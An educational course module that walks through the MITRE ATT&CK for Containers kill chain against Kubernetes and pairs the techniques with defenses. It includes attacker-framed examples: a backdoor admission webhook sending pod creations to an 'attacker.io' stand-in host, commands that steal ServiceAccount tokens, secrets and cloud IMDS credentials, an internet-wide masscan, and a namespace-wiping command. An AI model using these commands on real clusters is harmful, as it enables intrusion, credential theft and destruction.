# MITRE ATT&CK for Containers — The Full Kill Chain

> **Module 01 · Course 38** — Before you can defend a Kubernetes cluster, you need to think like the attacker. This module gives you the attacker's mental model: a systematic framework called MITRE ATT&CK that maps every step of a real cloud-native intrusion from "scanning the internet" to "data stolen, cluster owned."

---

## Why a Framework?

A one-off trick isn't an attack. A *kill chain* is. Real attackers don't just find one misconfiguration and stop — they chain techniques together: initial access → escalation → lateral movement → exfiltration. MITRE ATT&CK for Containers (and its parent, ATT&CK for Cloud) catalogues every known technique with a name, an ID, and real-world examples.

Why does this matter for defenders?

> If you don't know the full chain, you'll fix step 2 and leave step 5 wide open.

The framework has two parts relevant here:
- **MITRE ATT&CK for Containers** — techniques specific to container runtimes and orchestrators (K8s, ECS, etc.)
- **MITRE ATT&CK for Cloud** — techniques targeting cloud control planes (AWS IAM, GCP, Azure)

We'll use both.

---

## The Kill Chain at a Glance

```
INITIAL ACCESS          EXECUTION               PERSISTENCE
─────────────           ─────────────           ─────────────
Exposed Dashboard       kubectl exec            Backdoor SA token
Default SA token        Pod with hostPID        DaemonSet implant
Vulnerable app          Privileged container    Admission webhook
Image with malware      Node port exploit       CronJob backdoor
        │                       │                       │
        └───────────────────────▼───────────────────────┘
                                │
        PRIVILEGE ESCALATION    │    CREDENTIAL ACCESS
        ─────────────────────   │    ──────────────────
        hostPath: /             │    /var/run/secrets/
        CAP_SYS_ADMIN           │    etcd direct read
        Privileged pod          │    env var secrets
        Node filesystem         │    Cloud IMDS token
                │               │            │
                └───────────────▼────────────┘
                                │
        LATERAL MOVEMENT        │    DISCOVERY
        ────────────────        │    ─────────
        Stolen SA token         │    kubectl get all
        Namespace pivot         │    Service enumeration
        Cloud IAM creds         │    Node list
                │               │            │
                └───────────────▼────────────┘
                                │
                       IMPACT / EXFILTRATION
                       ──────────────────────
                       Data exfil via DNS
                       Crypto mining
                       Cluster destruction
                       Cloud resource abuse
```

Notice the arrows: each stage feeds the next. Credential Access fuels both Lateral Movement and Privilege Escalation. Discovery runs in parallel with almost everything else — attackers are always enumerating.

---

## The Attacker's Mental Model

Before running any command, a skilled attacker asks three questions:

1. **What am I?** — What identity do I have? Pod? SA token? Cloud IAM role?
2. **What can I see?** — What APIs, services, and hosts are reachable from here?
3. **What can I do?** — What permissions does my identity have? What misconfigurations exist?

This is the loop that runs at every stage. When the attacker escalates privileges, they re-ask all three questions with their new identity. When they move laterally, same loop. Defenders need to answer "what can an attacker *do* from each position" — not just "is this configuration technically correct."

---

## Tactic-by-Tactic Breakdown

### 1. Initial Access (TA0001)

The attacker's goal: get *any* execution inside the cluster boundary.

| Technique | ATT&CK ID | How it works |
|-----------|-----------|-------------|
| Exposed Kubernetes Dashboard | T1133 | Dashboard deployed without auth, accessible via NodePort or LoadBalancer |
| Valid Accounts – Default SA | T1078.004 | Default SA token auto-mounted in every pod, often has list/get permissions |
| Supply Chain Compromise | T1195 | Malicious code baked into an image that gets deployed |
| Exploit Public-Facing App | T1190 | RCE in a web app running in a pod gives a shell inside the container |
| External Remote Services | T1133 | Kubelet API (port 10250) exposed without auth allows running commands in pods |

**What just happened:** The attacker lands inside a container. They're sandboxed from the host by namespaces and cgroups — but the network is wide open to the Kubernetes API server, and their pod has a ServiceAccount token that may have permissions.

---

### 2. Execution (TA0002)

Goal: run attacker-controlled code inside the cluster.

| Technique | ATT&CK ID | How it works |
|-----------|-----------|-------------|
| Container Administration Command | T1609 | `kubectl exec` attaches a shell to a running container's PID namespace |
| Deploy Container | T1610 | Attacker deploys a new malicious pod (requires create pod permission) |
| User Execution | T1204 | Triggering exec in an existing container via a web shell or API |

```bash
# Attacker with stolen cluster-admin token deploys an execution pod
kubectl run attacker-shell \
  --image=alpine:3.20 \
  --restart=Never \
  --rm -it \
  -- sh

# What kubectl exec does under the hood:
# 1. POST /api/v1/namespaces/default/pods/target/exec
# 2. API server proxies to kubelet on the node
# 3. kubelet calls container runtime: attach to container's PID namespace
# 4. stdin/stdout are piped over WebSocket
# → The attacker now has a shell sharing the container's namespaces
```

---

### 3. Persistence (TA0003)

Goal: survive pod restarts, container kills, and credential rotation.

| Technique | ATT&CK ID | How it works |
|-----------|-----------|-------------|
| Account Manipulation | T1098 | Create a new ServiceAccount + ClusterRoleBinding with high permissions |
| Implant Internal Image | T1525 | Push a backdoored image to the internal registry |
| DaemonSet Implant | custom | A DaemonSet runs on every node — delete one pod, another spawns |
| Malicious Admission Webhook | T1611 | A MutatingWebhookConfiguration intercepts every new pod creation |

The admission webhook technique is especially dangerous because it's invisible to casual inspection:

```yaml
# Backdoor: inject env var into every pod in every namespace
apiVersion: admissionregistration.k8s.io/v1
kind: MutatingWebhookConfiguration
metadata:
  name: inject-backdoor
webhooks:
- name: inject.attacker.io
  rules:
  - operations: ["CREATE"]
    resources: ["pods"]
  clientConfig:
    url: "https://attacker.io/inject"  # attacker's webhook server
  admissionReviewVersions: ["v1"]
  sideEffects: None
# Every new pod creation is now sent to the attacker's server
# They can inject env vars, volumes, or sidecar containers
```

---

### 4. Privilege Escalation (TA0004)

Goal: go from "user in a container" to "effectively root on the node."

| Technique | ATT&CK ID | How it works |
|-----------|-----------|-------------|
| Escape to Host via hostPath | T1611 | Mount `/` from the host, then `chroot` |
| Privileged Container | T1611 | `privileged: true` grants all capabilities + `/dev` access |
| CAP_SYS_ADMIN | T1611 | Allows mounting filesystems, manipulating namespaces |
| hostPID + nsenter | T1611 | Enter any host process's namespaces from inside a pod |

> See Module 03 for the full privileged pod escape walkthrough.
> See Course 03 Modules 02 and 05 for RBAC privilege escalation and container escape techniques.

---

### 5. Defense Evasion (TA0005)

Goal: avoid detection while doing everything above.

| Technique | How it works |
|-----------|-------------|
| Use legitimate tools | Curl, wget, nslookup — not offensive tools, so Falco misses them |
| Delete audit log entries | Modify/truncate the audit log if the attacker has filesystem access |
| Use sleep between commands | Avoid burst activity patterns that IDS might flag |
| Encode payloads | Base64-encode commands to avoid string-based detection |
| Short-lived containers | Use `--restart=Never` pods that run once and vanish |

This is why Course 38 Module 09 (runtime evasion) is so important — Falco has gaps, and knowing them is necessary for both red and blue teams.

---

### 6. Credential Access (TA0006)

Goal: steal credentials that enable the next phase.

| Technique | ATT&CK ID | How it works |
|-----------|-----------|-------------|
| SA token from pod filesystem | T1552.007 | `/var/run/secrets/kubernetes.io/serviceaccount/token` is in every pod |
| Environment variable secrets | T1552.005 | `printenv` inside a container reveals hardcoded creds |
| Cloud IMDS token | T1552.005 | `curl http://169.254.169.254/...` returns cloud IAM credentials |
| etcd direct read | T1552 | If etcd is reachable, all secrets are readable in plaintext without decryption |

```bash
# Steal SA token from a running pod (attacker has kubectl access):
kubectl exec -n production pod/api-server -- \
  cat /var/run/secrets/kubernetes.io/serviceaccount/token

# Get env vars from a running pod:
kubectl exec -n production pod/api-server -- printenv | grep -i \
  -e password -e secret -e key -e token -e credential

# From inside a pod — cloud IMDS (AWS):
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

---

### 7. Discovery (TA0007)

Goal: enumerate everything — what's here, who can do what, what's valuable.

```bash
# Attacker with a valid token runs these in sequence:

# What cluster am I in?
kubectl cluster-info

# What namespaces exist?
kubectl get namespaces

# What pods are running?
kubectl get pods -A

# What services are exposed?
kubectl get svc -A

# What secrets exist?
kubectl get secrets -A

# What can MY token do?
kubectl auth can-i --list

# What nodes are there, and what's their cloud instance type?
kubectl get nodes -o wide
```

---

### 8. Lateral Movement (TA0008)

Goal: move from initial compromised position to higher-value targets.

| Technique | How it works |
|-----------|-------------|
| Use stolen SA token | Switch from your low-privilege token to one found in another namespace |
| Cloud IAM pivot | Use IMDS-stolen creds to access other cloud services or clusters |
| Exploit service trust | The `backend` service trusts the `frontend` pod by IP; hijack it |
| Access the node | Get a shell on the node, then reach all pods on that node |

> See Module 04 for the namespace hopping walkthrough and DNS exfiltration.

---

### 9. Impact / Exfiltration (TA0040 / TA0010)

Goal: achieve the attacker's objective — data theft, ransomware, crypto mining, or destruction.

| Technique | How it works |
|-----------|-------------|
| DNS tunneling exfil | Encode data in DNS TXT queries — usually not blocked by NetworkPolicy |
| HTTPS exfil | POST data to attacker's server on port 443 — usually allowed egress |
| Crypto mining | Deploy a DaemonSet running a miner on every node |
| Resource hijacking | Spin up GPU/CPU-intensive pods to mine crypto at the victim's cost |
| Cluster destruction | `kubectl delete namespace --all` with cluster-admin |

---

## Three Attack Archetypes

### Opportunistic (most common)

The attacker scans the internet for exposed K8s dashboards, anonymous kubelets, or unauthenticated API servers. No specific target. Fast. Automated. The first step is always recon at scale.

```bash
# Attacker's automated scanner:
masscan 0.0.0.0/0 -p 6443,8080,10250,2379 --rate 100000
# Finds every exposed K8s API server and kubelet on the internet
```

### Targeted

The attacker knows the target organization. They spear-phish a developer, steal their `~/.kube/config`, or compromise a CI/CD pipeline that has cluster access. The attack is slower but more precise.

### Supply Chain

The attacker doesn't target the runtime at all. They compromise an upstream dependency, a base image, or a build tool. By the time the malicious code runs in production, the attack is already complete. See Course 30 for the full supply chain security treatment.

---

## The Purple Team View

The most useful perspective is "purple team" — simultaneously thinking like attacker AND defender. For every technique above, ask:

| Attacker action | Blue team detection | Blue team prevention |
|-----------------|--------------------|--------------------|
| `kubectl exec -- sh` | Falco: Shell Spawned in Container | Admission: deny exec via OPA |
| Privileged pod deployment | Falco: Launch Privileged Container | Kyverno: deny privileged=true |
| IMDS credential theft | Falco: IMDS Access from Container | NetworkPolicy: deny 169.254.169.254 |
| Secret enumeration via API | K8s Audit Log: list secrets event | RBAC: least-privilege SA tokens |
| DaemonSet backdoor | Audit Log: DaemonSet created in kube-system | OPA: deny DaemonSet in system namespaces |

We'll build all of these controls in Modules 06–12.

---

## Checkpoint

You're ready for Module 02 when you can answer these without looking:

1. What are the 9 MITRE ATT&CK tactics relevant to K8s, in order?
2. What three questions does an attacker ask at every stage of the kill chain?
3. A pod has a ServiceAccount token. What tactic does using that token fall under?
4. What makes a MutatingWebhookConfiguration a persistence mechanism?
5. What is the difference between Privilege Escalation and Initial Access in ATT&CK terms?
6. Why is `hostPath: /` a privilege escalation technique, not just a misconfiguration?
7. Name two defense evasion techniques that don't involve deleting logs.
8. What does `kubectl exec` do at the kernel level — specifically, which namespaces does it use?
9. How does DNS tunneling exfiltration bypass most NetworkPolicy egress rules?
10. What is the difference between an opportunistic and a targeted K8s attack?

➡ Next: **Reconnaissance & Initial Access** — the specific techniques and tools for getting your first foothold.
